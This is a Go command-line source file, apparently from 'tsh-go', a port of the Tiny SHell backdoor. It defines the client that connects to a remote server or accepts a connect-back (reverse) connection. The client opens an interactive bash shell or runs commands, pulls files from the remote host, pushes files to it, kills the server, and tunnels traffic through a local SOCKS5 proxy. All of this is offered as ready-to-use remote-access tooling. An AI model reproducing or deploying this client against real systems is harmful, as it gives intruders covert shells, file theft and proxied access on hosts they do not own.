package cmd

import (
	"fmt"
	"tsh-go/internal/client"
	"tsh-go/internal/constants"

	"github.com/spf13/cobra"
)

func init() {
	clientCmd.PersistentFlags().StringVarP(&clientSecret, "secret", "s", defaultSecret, "Pre-shared secret for encryption")
	clientCmd.PersistentFlags().StringVarP(&clientHost, "connect", "c", "", "Target host, use 'cb' for connect-back mode")
	clientCmd.MarkPersistentFlagRequired("connect")
	clientCmd.PersistentFlags().IntVarP(&clientPort, "port", "p", defaultPort, "Target port")
	clientCmd.AddCommand(clientKillCmd)
	clientCmd.AddCommand(clientGetCmd)
	clientCmd.AddCommand(clientPutCmd)
	clientSocks5Cmd.Flags().StringVarP(&clientSocks5Addr, "sock", "a", "localhost:9050", "Listen address for SOCKS5 proxy")
	clientCmd.AddCommand(clientSocks5Cmd)
	rootCmd.AddCommand(clientCmd)
}

var clientHost string
var clientSecret string
var clientPort int
var clientSocks5Addr string

var clientCmd = &cobra.Command{
	Use:     "client -c {target | cb} [-p port] [-s secret] [action | command]",
	Aliases: []string{"c"},
	Args: func(cmd *cobra.Command, args []string) error {
		if len(args) > 1 {
			return fmt.Errorf("the action or command must be a single argument, did you forget to quote it?")
		}
		return nil
	},
	Short: "Tiny SHell client",
	Long:  `Tiny SHell client connects to remote server or accept incoming connection, and does the specified action.`,
	Example: `  tsh client -c 172.16.123.45
  tsh client -c cb -p 1337
  tsh client -c 127.0.0.1 -s hello 'ls -la /'`,
	Run: func(cmd *cobra.Command, args []string) {
		arg := client.RunShellArgs{Command: "exec bash --login"}
		if len(args) > 0 {
			arg.Command = args[0]
		}
		client.Run([]byte(clientSecret), clientHost, clientPort, constants.RunShell, arg)
	},
}

var clientKillCmd = &cobra.Command{
	Use:   "kill",
	Args:  cobra.NoArgs,
	Short: "Kill remote server",
	Run: func(cmd *cobra.Command, args []string) {
		client.Run([]byte(clientSecret), clientHost, clientPort, constants.Kill, nil)
	},
}
var clientGetCmd = &cobra.Command{
	Use:   "get <source-file> <dest-dir>",
	Args:  cobra.ExactArgs(2),
	Short: "Get file from remote",
	Run: func(cmd *cobra.Command, args []string) {
		arg := client.GetFileArgs{Srcfile: args[0], Dstdir: args[1]}
		client.Run([]byte(clientSecret), clientHost, clientPort, constants.GetFile, arg)
	},
}
var clientPutCmd = &cobra.Command{
	Use:   "put <source-file> <dest-dir>",
	Args:  cobra.ExactArgs(2),
	Short: "Put local file to remote",
	Run: func(cmd *cobra.Command, args []string) {
		arg := client.PutFileArgs{Srcfile: args[0], Dstdir: args[1]}
		client.Run([]byte(clientSecret), clientHost, clientPort, constants.PutFile, arg)
	},
}
var clientSocks5Cmd = &cobra.Command{
	Use:   "socks5 ",
	Args:  cobra.NoArgs,
	Short: "Start a local socks5 proxy (not recommended to be used in connect-back mode)",
	Run: func(cmd *cobra.Command, args []string) {
		arg := client.Socks5Args{Socks5Addr: clientSocks5Addr}
		client.Run([]byte(clientSecret), clientHost, clientPort, constants.SOCKS5, arg)
	},
}
